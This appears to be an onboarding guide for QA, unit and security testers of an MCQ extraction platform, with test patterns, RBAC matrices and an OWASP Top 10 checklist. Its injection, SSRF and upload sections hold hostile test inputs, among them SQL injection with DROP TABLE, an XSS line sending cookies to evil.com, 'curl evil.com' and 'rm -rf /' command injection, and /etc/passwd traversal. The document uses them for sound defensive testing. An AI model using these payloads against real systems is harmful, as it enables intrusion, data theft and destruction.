# QA, Unit Testing & Cybersecurity Testing — Onboarding & Instructions

## For: MCQ Extraction Platform v2.0
## Audience: QA Engineer, Unit Tester, Cybersecurity Tester

---

## 1. Read These First

Read in this exact order before writing any test:

1. **qa-testing.md** — Test pyramid, tooling, golden dataset, provider mocking, quality gates
2. **security.md** — STRIDE threat model, auth, RBAC, encryption, audit logging, file upload security
3. **apis.md** — 145 endpoints = your test surface. Every endpoint needs happy path + error paths.
4. **requirements-analysis.md** — Functional requirements = what "correct" means
5. **user-flows.md** — End-to-end user journeys = your E2E test scripts
6. **non-functional-requirements.md** — Performance/accessibility/reliability targets = your pass/fail thresholds
7. **databases.md** — Data model = data integrity validations
8. **backend.md** — RBAC permission matrix = authorization test cases
9. **traceability-matrix.md** — Maps requirements → tests. Use this to confirm coverage.

---

## 2. Your Three Roles, Clearly Scoped

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        YOUR RESPONSIBILITIES                            │
├──────────────────┬──────────────────────┬───────────────────────────────┤
│  QA Engineer     │  Unit/Integration    │  Cybersecurity Tester         │
│                  │  Tester              │                               │
├──────────────────┼──────────────────────┼───────────────────────────────┤
│ Test strategy    │ Write unit tests     │ Threat modeling               │
│ E2E test suite   │ Write integration    │ Penetration testing           │
│ Golden dataset   │   tests              │ OWASP Top 10 validation       │
│ Test data mgmt   │ Provider mock tests  │ Auth/RBAC bypass testing      │
│ Bug triage       │ Coverage tracking    │ Input injection testing       │
│ Quality gates    │ CI test pipeline     │ File upload security          │
│ Regression       │ Mutation testing     │ Dependency vulnerability scan │
│   testing        │   (Phase 3+)        │ Security header validation    │
│ Accessibility    │                      │ Data leakage auditing         │
│   testing        │                      │ Incident response testing     │
└──────────────────┴──────────────────────┴───────────────────────────────┘
```

---

## 3. Tech Stack (Testing Tools)

| Purpose | Tool | Install Scope |
|---------|------|---------------|
| Unit + integration tests | **Vitest** | Per-package devDependency |
| React component testing | **@testing-library/react** | apps/web devDependency |
| API endpoint testing | **Supertest** | apps/api devDependency |
| HTTP mocking (providers) | **MSW (Mock Service Worker) v2** | packages/test-fixtures |
| E2E browser testing | **Playwright** | apps/web devDependency |
| Accessibility testing | **axe-core** (`@axe-core/playwright`) | apps/web devDependency |
| Code coverage | **Vitest c8/istanbul** | Per-package devDependency |
| Performance / load testing | **k6** | Separate test project |
| Security scanning (DAST) | **OWASP ZAP** | CI pipeline or manual |
| Dependency audit | **npm audit + Snyk** | CI pipeline |
| Static analysis (SAST) | **ESLint security plugin + CodeQL** | CI pipeline |
| Secret scanning | **git-secrets or GitGuardian** | CI pre-commit hook |
| Mutation testing (Phase 3+) | **Stryker** | Per-package devDependency |
| API security testing | **Burp Suite Community** (manual) | Local install |
| Container scanning | **Trivy** | CI pipeline |

---

## 4. Test Environment Setup

### 4.1 Local Test Infrastructure

```yaml
# docker-compose.test.yml — isolated from dev environment
services:
  postgres-test:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: mcq_test
      POSTGRES_USER: test
      POSTGRES_PASSWORD: test
    ports:
      - "5433:5432"    # Different port from dev
    tmpfs:
      - /var/lib/postgresql/data    # RAM disk for speed

  redis-test:
    image: redis:7-alpine
    ports:
      - "6380:6379"    # Different port from dev

  minio-test:
    image: minio/minio
    command: server /data
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    ports:
      - "9002:9000"    # Different port from dev
```

### 4.2 Test Environment Variables

```bash
# .env.test — committed to repo (no real secrets)
NODE_ENV=test
DATABASE_URL=postgresql://test:test@localhost:5433/mcq_test
REDIS_URL=redis://localhost:6380
S3_ENDPOINT=http://localhost:9002
S3_BUCKET=mcq-test
S3_ACCESS_KEY=minioadmin
S3_SECRET_KEY=minioadmin
SESSION_SECRET=test-session-secret-minimum-32-chars-long
ENCRYPTION_KEY=test-encryption-key-minimum-32-chars
PARSER_SERVICE_URL=http://localhost:5001
```

### 4.3 Test Database Rules

```
Before each test suite:  Run migrations (fresh schema)
Before each test:        Seed only the data that test needs
After each test:         Truncate all tables (fast reset)
After all tests:         Drop test database

NEVER run tests against the dev or staging database.
NEVER share test data between test files.
```

---

## 5. Unit Testing

### 5.1 What to Unit Test

| Package | What to Test | Examples | Target Coverage |
|---------|-------------|---------|----------------|
| packages/validators | Zod schemas, custom rules | MCQ field validation, file type checks, email format | 95% |
| packages/confidence | Score calculation | Multi-signal composite scoring, weight application, edge cases | 95% |
| packages/hallucination | Detection logic | Each tier's heuristics, thresholds, false positive scenarios | 90% |
| packages/export-engine | Format generators | QTI XML structure, SCORM packaging, xAPI statements | 90% |
| packages/provider-adapters | Response normalization | Transform provider-specific output → standard format | 90% |
| packages/auth | Password hashing, session | bcrypt verify, session TTL, permission resolution | 85% |
| packages/cost-intelligence | Cost formulas | Token cost calculation, budget threshold logic | 90% |
| packages/shared-types | Type guards | Runtime type validation functions | 80% |
| apps/api (services) | Business logic | State transitions, workspace scoping, pagination logic | 80% |
| apps/web (components) | Render + interaction | Conditional rendering, form validation, state changes | 60% |
| apps/web (hooks) | Custom hooks | Data transformation, debouncing, state management | 80% |
| apps/web (stores) | Zustand stores | State transitions, actions, selectors | 80% |

### 5.2 Unit Test Pattern

```typescript
// packages/validators/src/__tests__/mcq-validation.test.ts
import { describe, it, expect } from "vitest";
import { mcqRecordSchema, validateMCQFields } from "../mcq/mcq-record.schema";

describe("MCQ Record Validation", () => {
  describe("mcqRecordSchema", () => {
    it("accepts a valid MCQ record with all required fields", () => {
      const valid = {
        questionText: "What is 2 + 2?",
        options: [
          { label: "A", text: "3" },
          { label: "B", text: "4" },
          { label: "C", text: "5" },
          { label: "D", text: "6" },
        ],
        correctAnswer: "B",
        explanation: "Basic addition",
        pageNumber: 1,
      };

      const result = mcqRecordSchema.safeParse(valid);
      expect(result.success).toBe(true);
    });

    it("rejects when questionText is empty", () => {
      const invalid = {
        questionText: "",
        options: [{ label: "A", text: "yes" }, { label: "B", text: "no" }],
        correctAnswer: "A",
      };

      const result = mcqRecordSchema.safeParse(invalid);
      expect(result.success).toBe(false);
      expect(result.error?.issues[0].path).toContain("questionText");
    });

    it("rejects when fewer than 2 options provided", () => {
      const invalid = {
        questionText: "Valid question?",
        options: [{ label: "A", text: "only one" }],
        correctAnswer: "A",
      };

      const result = mcqRecordSchema.safeParse(invalid);
      expect(result.success).toBe(false);
    });

    it("rejects when correctAnswer is not one of the option labels", () => {
      const invalid = {
        questionText: "Valid question?",
        options: [
          { label: "A", text: "yes" },
          { label: "B", text: "no" },
        ],
        correctAnswer: "C",  // Not a valid option
      };

      const result = mcqRecordSchema.safeParse(invalid);
      expect(result.success).toBe(false);
    });
  });

  describe("validateMCQFields", () => {
    it("flags duplicate option text as a warning", () => {
      const mcq = {
        questionText: "What color?",
        options: [
          { label: "A", text: "Red" },
          { label: "B", text: "Red" },  // Duplicate!
          { label: "C", text: "Blue" },
        ],
        correctAnswer: "A",
      };

      const warnings = validateMCQFields(mcq);
      expect(warnings).toContainEqual(
        expect.objectContaining({ code: "DUPLICATE_OPTION_TEXT" })
      );
    });
  });
});
```

### 5.3 Unit Test Rules

```
✅ DO:
  - Test one behavior per test case (single assertion focus)
  - Use descriptive test names: "rejects when correctAnswer is not one of the option labels"
  - Test edge cases: empty strings, null, undefined, boundary values, Unicode, RTL text
  - Test error cases: What does the function do when given bad input?
  - Group related tests with describe() blocks
  - Use factory functions for test data (never hardcode complex objects inline)

❌ DON'T:
  - Test implementation details (private methods, internal state)
  - Test framework behavior (Zod parsing itself, Express routing)
  - Use snapshots for logic tests (snapshots are for render output only)
  - Write tests that pass when the code is wrong (no tautological tests)
  - Share mutable state between tests
  - Use real HTTP calls, database queries, or file system in unit tests
```

---

## 6. Integration Testing

### 6.1 What to Integration Test

| Domain | What to Test | Key Scenarios |
|--------|-------------|---------------|
| Auth endpoints | Login, register, logout, session | Valid login, wrong password, expired session, concurrent sessions |
| RBAC enforcement | Permission checks on every endpoint | Each role × each endpoint = access matrix validation |
| Document CRUD | Upload, list, detail, delete | Create → read → update → delete lifecycle |
| Job lifecycle | Create job → queue → process → complete | Happy path, failure, retry, cancel |
| MCQ record CRUD | Create, list, filter, sort, edit, version | Pagination, filtering, inline edit, version history |
| Provider management | CRUD + test connection | Add provider, test connection mock, update key, disable |
| Review workflow | Queue → assign → approve/reject | State transitions, rejection reasons, batch actions |
| Export pipeline | Select → generate → download | Format validation, signed URL generation |
| Cross-workspace isolation | User A vs User B data | Verify user cannot access other workspace's data |
| Idempotency | Duplicate POST requests | Same Idempotency-Key → same response, no duplicate creation |
| Rate limiting | Request floods | Verify 429 response after limit exceeded |
| Pagination | Cursor-based navigation | Forward, backward, empty results, deleted items |

### 6.2 Integration Test Pattern

```typescript
// apps/api/src/modules/review/__tests__/review.integration.test.ts
import { describe, it, expect, beforeAll, beforeEach, afterAll } from "vitest";
import request from "supertest";
import { app } from "../../../server";
import { db } from "@mcq/db";
import {
  createUser,
  createSession,
  createWorkspace,
  createDocument,
  createMCQRecord,
} from "@mcq/test-fixtures";

describe("Review Workflow Integration", () => {
  let operatorCookie: string;
  let reviewerCookie: string;
  let analystCookie: string;
  let workspaceId: string;
  let mcqRecordId: string;

  beforeAll(async () => {
    // Setup workspace with users of different roles
    const workspace = await createWorkspace();
    workspaceId = workspace.id;

    const operator = await createUser({ role: "operator", workspaceId });
    const reviewer = await createUser({ role: "reviewer", workspaceId });
    const analyst = await createUser({ role: "analyst", workspaceId });

    operatorCookie = await createSession(operator.id);
    reviewerCookie = await createSession(reviewer.id);
    analystCookie = await createSession(analyst.id);
  });

  beforeEach(async () => {
    // Create a fresh MCQ record for each test
    const doc = await createDocument({ workspaceId });
    const mcq = await createMCQRecord({
      documentId: doc.id,
      status: "needs_review",
    });
    mcqRecordId = mcq.id;
  });

  describe("GET /api/v1/review/queue", () => {
    it("returns review items for reviewer role", async () => {
      const res = await request(app)
        .get("/api/v1/review/queue")
        .set("Cookie", reviewerCookie);

      expect(res.status).toBe(200);
      expect(res.body.data).toBeInstanceOf(Array);
      expect(res.body.data.length).toBeGreaterThan(0);
    });

    it("returns 403 for analyst role (no review permission)", async () => {
      const res = await request(app)
        .get("/api/v1/review/queue")
        .set("Cookie", analystCookie);

      expect(res.status).toBe(403);
    });

    it("does not return items from other workspaces", async () => {
      // Create MCQ in a DIFFERENT workspace
      const otherWs = await createWorkspace();
      const otherDoc = await createDocument({ workspaceId: otherWs.id });
      await createMCQRecord({
        documentId: otherDoc.id,
        status: "needs_review",
      });

      const res = await request(app)
        .get("/api/v1/review/queue")
        .set("Cookie", reviewerCookie);

      // Should NOT contain the other workspace's MCQ
      const ids = res.body.data.map((item: any) => item.documentId);
      expect(ids).not.toContain(otherDoc.id);
    });
  });

  describe("POST /api/v1/review/:id/approve", () => {
    it("transitions MCQ from needs_review to approved", async () => {
      const res = await request(app)
        .post(`/api/v1/review/${mcqRecordId}/approve`)
        .set("Cookie", reviewerCookie);

      expect(res.status).toBe(200);
      expect(res.body.data.status).toBe("approved");

      // Verify audit log was created
      const auditLogs = await db.query.auditLogs.findMany({
        where: (log, { eq }) => eq(log.resourceId, mcqRecordId),
      });
      expect(auditLogs).toHaveLength(1);
      expect(auditLogs[0].action).toBe("mcq.approve");
    });

    it("rejects approval of already-approved MCQ (409 conflict)", async () => {
      // First approval
      await request(app)
        .post(`/api/v1/review/${mcqRecordId}/approve`)
        .set("Cookie", reviewerCookie);

      // Second approval attempt
      const res = await request(app)
        .post(`/api/v1/review/${mcqRecordId}/approve`)
        .set("Cookie", reviewerCookie);

      expect(res.status).toBe(409);
    });

    it("returns 403 for operator role (no review permission)", async () => {
      const res = await request(app)
        .post(`/api/v1/review/${mcqRecordId}/approve`)
        .set("Cookie", operatorCookie);

      expect(res.status).toBe(403);
    });
  });
});
```

### 6.3 RBAC Test Matrix

**You must test every role against every endpoint category.** Generate this matrix systematically:

| Endpoint | Super Admin | WS Admin | Operator | Reviewer | Analyst | API User | Unauthenticated |
|----------|:-----------:|:--------:|:--------:|:--------:|:-------:|:--------:|:---------------:|
| POST /auth/login | N/A | N/A | N/A | N/A | N/A | N/A | ✅ 200 |
| GET /documents | ✅ 200 | ✅ 200 | ✅ 200 | ✅ 200 | ✅ 200 | ✅ 200 | ❌ 401 |
| POST /documents/upload | ✅ 201 | ✅ 201 | ✅ 201 | ❌ 403 | ❌ 403 | ✅ 201 | ❌ 401 |
| POST /jobs | ✅ 202 | ✅ 202 | ✅ 202 | ❌ 403 | ❌ 403 | ✅ 202 | ❌ 401 |
| POST /review/:id/approve | ✅ 200 | ✅ 200 | ❌ 403 | ✅ 200 | ❌ 403 | ❌ 403 | ❌ 401 |
| GET /analytics | ✅ 200 | ✅ 200 | ❌ 403 | ❌ 403 | ✅ 200 | ✅ 200 | ❌ 401 |
| PUT /providers/:id | ✅ 200 | ✅ 200 | ❌ 403 | ❌ 403 | ❌ 403 | ❌ 403 | ❌ 401 |
| POST /workspaces | ✅ 201 | ❌ 403 | ❌ 403 | ❌ 403 | ❌ 403 | ❌ 403 | ❌ 401 |

**Every cell in this matrix = 1 test case.** Refer to the full RBAC permission matrix in [backend.md](docs/backend.md) and [security.md](docs/security.md).

---

## 7. End-to-End Testing (Playwright)

### 7.1 E2E Test Inventory

Map directly to user flows in **user-flows.md**:

| Test ID | Flow | Steps | Phase |
|---------|------|-------|-------|
| E2E-001 | Sign up → sign in → dashboard | Register, verify redirect, see dashboard | P1 |
| E2E-002 | Create workspace → create project | Form submission, verify created | P1 |
| E2E-003 | Upload PDF → appears in list → processing starts | Drag-drop, wait for upload, verify document card | P1 |
| E2E-004 | View job progress → complete → MCQs visible | Real-time progress, completion, MCQ table populated | P1 |
| E2E-005 | Review queue → approve MCQ → status changes | Open review, click approve, verify status badge | P2 |
| E2E-006 | Reject MCQ → provide reason → re-extract | Reject flow, reason dialog, verify status | P2 |
| E2E-007 | Configure provider → test connection → save | Provider form, test button, success toast | P1 |
| E2E-008 | Export MCQ records → download QTI file | Select records, choose format, download | P3 |
| E2E-009 | Analytics dashboard → charts render | Navigate, verify chart elements present | P3 |
| E2E-010 | Admin: manage users → change role | User list, role dropdown, verify change | P1 |
| E2E-011 | Bulk upload → batch processing → batch review | Multi-file upload, batch progress, batch approve | P2 |
| E2E-012 | Search/filter/sort MCQ records | Table filter, sort column, verify results | P2 |

### 7.2 E2E Test Pattern

```typescript
// apps/web/e2e/upload-and-extract.spec.ts
import { test, expect } from "@playwright/test";

test.describe("Document Upload and Extraction (E2E-003, E2E-004)", () => {
  test.beforeEach(async ({ page }) => {
    // Login as operator
    await page.goto("/login");
    await page.fill('[data-testid="email"]', "operator@test.com");
    await page.fill('[data-testid="password"]', "TestPassword123!");
    await page.click('[data-testid="login-button"]');
    await page.waitForURL("/dashboard");
  });

  test("uploads a PDF and sees it in the document list", async ({ page }) => {
    // Navigate to project
    await page.click('[data-testid="project-link-test-project"]');
    await page.waitForURL(/\/projects\//);

    // Upload PDF
    const fileInput = page.locator('[data-testid="file-upload-input"]');
    await fileInput.setInputFiles("e2e/fixtures/sample-exam.pdf");

    // Verify upload progress
    await expect(page.locator('[data-testid="upload-progress"]')).toBeVisible();

    // Wait for upload to complete
    await expect(page.locator('[data-testid="upload-success-toast"]'))
      .toBeVisible({ timeout: 30_000 });

    // Verify document appears in list
    await expect(page.locator('[data-testid="document-card"]').first())
      .toContainText("sample-exam.pdf");
  });

  test("extraction job completes and MCQ records appear", async ({ page }) => {
    // Navigate to document with completed upload
    await page.goto("/projects/test-project/documents/test-doc");

    // Trigger extraction
    await page.click('[data-testid="extract-button"]');

    // Wait for job to complete (may take time with real providers in staging)
    await expect(page.locator('[data-testid="job-status-completed"]'))
      .toBeVisible({ timeout: 120_000 });

    // Verify MCQ records are shown
    const mcqRows = page.locator('[data-testid="mcq-table-row"]');
    await expect(mcqRows.first()).toBeVisible();
    expect(await mcqRows.count()).toBeGreaterThan(0);
  });
});
```

### 7.3 E2E Rules

```
✅ DO:
  - Use data-testid attributes for element selection (NOT CSS classes or text content)
  - Set generous timeouts for async operations (upload, extraction, export)
  - Test on at least 2 browsers: Chromium + Firefox
  - Test at viewports: 1280×720 (laptop), 1920×1080 (desktop)
  - Seed test data via API calls in beforeAll (not via UI — too slow)
  - Clean up test data in afterAll
  - Take screenshots on failure (Playwright does this by default)

❌ DON'T:
  - Rely on CSS selectors that change with styling (use data-testid)
  - Use fixed waits (await page.waitForTimeout(5000)) — use element assertions
  - Test the same logic as unit/integration tests (E2E tests broad flows only)
  - Run E2E against production database
  - Leave test accounts in the system after test run
```

---

## 8. Accessibility Testing

### 8.1 Automated (axe-core + Playwright)

```typescript
// apps/web/e2e/accessibility.spec.ts
import { test, expect } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";

const pagesToTest = [
  { name: "Login", path: "/login" },
  { name: "Dashboard", path: "/dashboard" },
  { name: "Document List", path: "/projects/test-project/documents" },
  { name: "MCQ Table", path: "/projects/test-project/mcq-records" },
  { name: "Review Queue", path: "/review" },
  { name: "Provider Settings", path: "/settings/providers" },
  { name: "User Management", path: "/settings/users" },
  { name: "Analytics", path: "/analytics" },
];

for (const page of pagesToTest) {
  test(`${page.name} page has no accessibility violations`, async ({ page: p }) => {
    await p.goto(page.path);
    await p.waitForLoadState("networkidle");

    const results = await new AxeBuilder({ page: p })
      .withTags(["wcag2a", "wcag2aa"])  // WCAG 2.1 Level AA
      .analyze();

    expect(results.violations).toEqual([]);
  });
}
```

### 8.2 Manual Accessibility Checklist

Run this manually for every new screen:

| # | Check | How |
|---|-------|-----|
| 1 | Tab through entire page | Every interactive element reachable? Logical order? |
| 2 | Focus visible? | Can you always see which element is focused? |
| 3 | Screen reader test | NVDA (Windows) or VoiceOver (Mac): all content announced? |
| 4 | Keyboard-only operation | Can you complete the full user flow without a mouse? |
| 5 | Color contrast | Use browser devtools contrast checker on all text |
| 6 | Zoom to 200% | Page still usable? No content cut off? |
| 7 | Reduced motion | Enable `prefers-reduced-motion`: animations stop? |
| 8 | Form errors | Are errors announced to screen reader? Linked to fields? |
| 9 | Images | All `<img>` have alt text? Decorative images have `alt=""`? |
| 10 | Headings | One h1 per page? Logical h1→h2→h3 hierarchy? |

---

## 9. Cybersecurity Testing

### 9.1 OWASP Top 10 Test Checklist

| # | OWASP Category | Test Cases | Tool |
|---|---------------|-----------|------|
| A01 | **Broken Access Control** | See Section 9.2 below | Manual + Supertest |
| A02 | **Cryptographic Failures** | See Section 9.3 below | Manual + SSL Labs |
| A03 | **Injection** | See Section 9.4 below | Manual + OWASP ZAP |
| A04 | **Insecure Design** | See Section 9.5 below | Manual review |
| A05 | **Security Misconfiguration** | See Section 9.6 below | Manual + header scan |
| A06 | **Vulnerable Components** | `npm audit`, Snyk scan, Trivy | Automated CI |
| A07 | **Auth Failures** | See Section 9.7 below | Manual + Supertest |
| A08 | **Data Integrity Failures** | See Section 9.8 below | Manual review |
| A09 | **Logging Failures** | See Section 9.9 below | Manual review |
| A10 | **SSRF** | See Section 9.10 below | Manual + Burp |

### 9.2 A01: Broken Access Control Tests

```
Test: IDOR (Insecure Direct Object Reference)
──────────────────────────────────────────────
1. Login as User A (workspace A)
2. Note document ID: doc_abc from workspace A
3. Login as User B (workspace B)
4. Try: GET /api/v1/documents/doc_abc
   Expected: 404 (not 200 with User A's data)
   
5. Try: PUT /api/v1/documents/doc_abc
   Expected: 404 (not 200)

6. Try: DELETE /api/v1/documents/doc_abc
   Expected: 404 (not 204)

Repeat for EVERY resource type:
  - documents, mcq-records, jobs, providers, exports, workspaces, projects

Test: Privilege Escalation
──────────────────────────
1. Login as Analyst (limited role)
2. Try: POST /api/v1/documents/upload
   Expected: 403

3. Try: POST /api/v1/providers (create provider config)
   Expected: 403

4. Try: PUT /api/v1/users/other-user-id (change another user's role)
   Expected: 403

5. Try to modify your own role:
   PUT /api/v1/users/my-id { "role": "super_admin" }
   Expected: 403

Test: Forced Browsing
─────────────────────
1. Access admin-only endpoints without admin role:
   GET /api/v1/admin/audit-logs
   GET /api/v1/admin/system-settings
   Expected: 403

Test: Signed URL Bypass
───────────────────────
1. Get a signed URL for document A
2. Try modifying the URL to access document B
   Expected: 403 from S3 (signature mismatch)

3. Wait for URL to expire (15 min), try again
   Expected: 403 from S3 (expired)
```

### 9.3 A02: Cryptographic Failures Tests

```
Test: TLS Configuration
───────────────────────
1. Run SSL Labs scan on production domain
   Expected: A+ rating, TLS 1.2+ only, no weak ciphers

2. Try connecting with TLS 1.0 or 1.1
   Expected: Connection refused

Test: Password Storage
──────────────────────
1. Check database: password column contains bcrypt hash (starts with $2b$)
   Expected: Never plaintext, never MD5/SHA1

2. Verify bcrypt cost factor ≥ 12
   Expected: Hash starts with $2b$12$ or higher

Test: Provider API Key Encryption
─────────────────────────────────
1. Query provider_configs table directly
   Expected: api_key column contains encrypted blob, NOT plaintext

2. Verify encryption uses AES-256-GCM
   Expected: Encrypted keys are not reversible without master key

Test: Session Token Entropy
───────────────────────────
1. Generate 100 session tokens
2. Verify randomness (no patterns, sufficient length)
   Expected: ≥ 128 bits of entropy
```

### 9.4 A03: Injection Tests

```
Test: SQL Injection
───────────────────
Against every endpoint that accepts user input:

1. GET /api/v1/documents?search=' OR '1'='1
   Expected: Empty results or 400 (not all documents returned)

2. GET /api/v1/documents?search='; DROP TABLE documents; --
   Expected: 400 or empty results (table not dropped)

3. POST /api/v1/auth/login { "email": "' OR 1=1 --", "password": "x" }
   Expected: 401 (not logged in as another user)

4. GET /api/v1/mcq-records?sortBy=name;DROP TABLE mcq_records
   Expected: 422 (invalid sort field)

Note: Drizzle ORM uses parameterized queries — SQL injection should be
impossible if no raw SQL is used. VERIFY no raw SQL exists in codebase:
  grep -r "db.execute\|sql\`" apps/ packages/ --include="*.ts"

Test: XSS (Stored / Reflected)
──────────────────────────────
1. Create MCQ record with question text:
   <script>alert('XSS')</script>
   Expected: Stored as text, rendered escaped in UI (no alert fires)

2. Create document with name:
   <img src=x onerror=alert('XSS')>
   Expected: Rendered escaped in all views

3. Submit review rejection reason:
   "><script>document.location='http://evil.com/'+document.cookie</script>
   Expected: Stored as text, rendered escaped

4. Test URL parameters:
   GET /dashboard?q=<script>alert(1)</script>
   Expected: Not reflected into page unescaped

Test: Command Injection
───────────────────────
1. Upload file with name:
   ; rm -rf / ;.pdf
   Expected: Filename sanitized; no command executed

2. Submit provider config with URL:
   http://localhost:5000; curl evil.com
   Expected: URL validated; no command executed

Test: Path Traversal
────────────────────
1. Request file: GET /api/v1/documents/../../../etc/passwd
   Expected: 404 or 400 (not file contents)

2. Upload with filename: ../../../etc/cron.d/evil
   Expected: Filename sanitized to safe value
```

### 9.5 A04: Insecure Design Tests

```
Test: Business Logic Flaws
──────────────────────────
1. Approve an MCQ that's in "extracted" state (not "needs_review")
   Expected: 409 (invalid state transition)

2. Export MCQs that are all "rejected"
   Expected: 422 or empty export (depending on business rule)

3. Delete a document that has active extraction jobs
   Expected: 409 (must cancel jobs first) or cascading cancel

4. Create more users than workspace limit (if limits exist)
   Expected: 422 with limit message

5. Upload file with .exe extension renamed to .pdf
   Expected: Rejected by MIME type / magic byte check (not just extension)

Test: Rate Limiting Effectiveness
─────────────────────────────────
1. Send 100 login attempts in 10 seconds
   Expected: 429 returned after 5 attempts; 15-minute lockout

2. Send 200 API requests in 1 minute
   Expected: 429 returned after configured limit

3. Verify rate limit is per-user AND per-IP (not just one)
```

### 9.6 A05: Security Misconfiguration Tests

```
Test: HTTP Security Headers
───────────────────────────
Verify ALL responses include:

  Content-Security-Policy: default-src 'self'; ...
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  X-XSS-Protection: 0

Use: curl -I https://api.domain.com

Test: Error Information Leakage
───────────────────────────────
1. Request invalid endpoint: GET /api/v1/nonexistent
   Expected: { "error": { "code": "NOT_FOUND" } } — NO stack trace

2. Send malformed JSON body
   Expected: 400 with "Invalid JSON" — NO framework error details

3. Cause a 500 error (if possible)
   Expected: Generic message "An unexpected error occurred" — NO stack trace, NO SQL details

Test: CORS Configuration
────────────────────────
1. Send request with Origin: https://evil-site.com
   Expected: No Access-Control-Allow-Origin header (blocked)

2. Send request with Origin: https://your-frontend-domain.com
   Expected: Access-Control-Allow-Origin matches

3. Verify: Access-Control-Allow-Origin is NOT *

Test: Directory Listing
───────────────────────
1. Access: GET /api/v1/
   Expected: Not a directory listing; 404 or defined response

Test: Debug Endpoints
─────────────────────
1. Access: GET /debug, /health (public), /metrics
   Expected: /health is public; /debug returns 404; /metrics is protected or absent
```

### 9.7 A07: Authentication Failure Tests

```
Test: Brute Force Protection
────────────────────────────
1. Send 5 wrong passwords for valid email
   Expected: Account locked for 15 minutes; 429 on 6th attempt

2. After lockout period, try valid password
   Expected: Login succeeds (lockout is temporary)

Test: Session Security
──────────────────────
1. Login → copy session cookie → logout → use copied cookie
   Expected: 401 (session invalidated on logout)

2. Login → wait for session TTL (24 hours) → use expired session
   Expected: 401 (session expired)

3. Check cookie flags (via browser devtools):
   - httpOnly: true (not accessible to JavaScript)
   - Secure: true (HTTPS only)
   - SameSite: Strict

4. Login → change password → use old session cookie
   Expected: 401 (sessions invalidated on password change)

Test: Password Reset
────────────────────
1. Request password reset → use token after 1 hour
   Expected: Token expired, reset fails

2. Request password reset → use token → try using same token again
   Expected: Token already used, reset fails

3. Request reset for non-existent email
   Expected: SAME response as valid email (no user enumeration)

Test: Registration
──────────────────
1. Register with existing email
   Expected: Generic "check your email" response (no user enumeration)

2. Register with weak password (< 12 chars)
   Expected: 422 with password requirements
```

### 9.8 A08: Data Integrity Tests

```
Test: Audit Log Integrity
─────────────────────────
1. Perform an action (approve MCQ)
2. Verify audit log entry exists with correct user, timestamp, action
3. Try to DELETE or UPDATE the audit log via API
   Expected: No endpoint exists; 404

4. Try to modify audit log directly in database (if you have access)
   Expected: Should be flagged as a test finding — recommend DB-level restrictions

Test: MCQ Version History
─────────────────────────
1. Edit an MCQ record
2. Verify version history contains the old version
3. Edit again
4. Verify both old versions are preserved
5. Try to delete version history via API
   Expected: Not possible
```

### 9.9 A09: Logging Failure Tests

```
Test: Security Events Are Logged
────────────────────────────────
1. Failed login → check logs for auth failure event
2. RBAC denial → check logs for forbidden event
3. Rate limit hit → check logs for rate limit event
4. Invalid input → check logs for validation failure

Test: No Sensitive Data in Logs
───────────────────────────────
1. Login → check logs do NOT contain the password
2. Create provider config → check logs do NOT contain the API key
3. Upload document → check logs do NOT contain file content
4. Search for PII → check logs mask emails, IPs

grep -r "password\|apiKey\|api_key\|secret" logs/ --ignore-case
Expected: No plaintext secrets found
```

### 9.10 A10: SSRF Tests

```
Test: Provider URL Validation
─────────────────────────────
1. Configure provider with URL: http://169.254.169.254/latest/meta-data/
   Expected: Rejected (AWS metadata endpoint — SSRF attempt)

2. Configure provider with URL: http://127.0.0.1:5432/
   Expected: Rejected (internal service)

3. Configure provider with URL: http://localhost:6379/
   Expected: Rejected (Redis)

4. Configure provider with URL: file:///etc/passwd
   Expected: Rejected (file protocol)

Test: Webhook/Callback URL Validation (if applicable)
─────────────────────────────────────────────────────
1. Set callback URL to internal IP range (10.x.x.x, 172.16.x.x, 192.168.x.x)
   Expected: Rejected
```

---

## 10. File Upload Security Tests

```
Test: File Type Validation
──────────────────────────
Upload each of these and verify REJECTION:

| File | Attack | Expected |
|------|--------|----------|
| virus.pdf (EICAR test file) | Virus | 422 "File failed security scan" |
| script.js renamed to script.pdf | Wrong MIME | 422 "Invalid file type" |
| exploit.exe renamed to exploit.pdf | Executable | 422 "Invalid file type" |
| payload.html renamed to payload.pdf | HTML | 422 "Invalid file type" |
| zero-byte.pdf (0 bytes) | Empty file | 422 "File is empty" |
| huge-file.pdf (100MB) | Size limit | 422 "File exceeds 50MB limit" |
| ../../../etc/passwd.pdf | Path traversal name | Filename sanitized |
| <script>alert(1)</script>.pdf | XSS in filename | Filename sanitized |
| polyglot.pdf (valid PDF + embedded JS) | Polyglot | ClamAV should flag |

Test: Upload Flow Security
──────────────────────────
1. Get signed upload URL → try uploading a .exe to that URL
   Expected: S3 rejects or backend rejects on processing

2. Get signed URL for document A → try using it for a different S3 key
   Expected: S3 rejects (signature mismatch)

3. Try uploading without a signed URL (direct to S3)
   Expected: S3 rejects (bucket is private)
```

---

## 11. Performance Testing (k6)

### 11.1 Load Test Scenarios

```javascript
// tests/k6/api-load-test.js
import http from "k6/http";
import { check, sleep } from "k6";

export const options = {
  stages: [
    { duration: "1m", target: 10 },   // Ramp up to 10 users
    { duration: "3m", target: 10 },   // Hold at 10 users
    { duration: "1m", target: 50 },   // Ramp up to 50 users
    { duration: "3m", target: 50 },   // Hold at 50 users
    { duration: "1m", target: 0 },    // Ramp down
  ],
  thresholds: {
    http_req_duration: ["p(95)<500"],  // 95% of requests under 500ms
    http_req_failed: ["rate<0.01"],    // Less than 1% failure rate
  },
};

export default function () {
  // Simulate typical user: list documents → view detail → list MCQs
  const listRes = http.get(`${BASE_URL}/api/v1/documents?limit=20`, { headers });
  check(listRes, { "list 200": (r) => r.status === 200 });

  sleep(1);

  const docId = JSON.parse(listRes.body).data[0]?.id;
  if (docId) {
    const detailRes = http.get(`${BASE_URL}/api/v1/documents/${docId}`, { headers });
    check(detailRes, { "detail 200": (r) => r.status === 200 });
  }

  sleep(1);
}
```

### 11.2 Performance Targets

| Scenario | Target | Threshold |
|----------|--------|-----------|
| API read endpoints (p95) | < 500ms | Fail if > 1s |
| API write endpoints (p95) | < 800ms | Fail if > 2s |
| Dashboard page load | < 2s | Fail if > 4s |
| MCQ table (1000 rows) | < 1s render | Fail if > 3s |
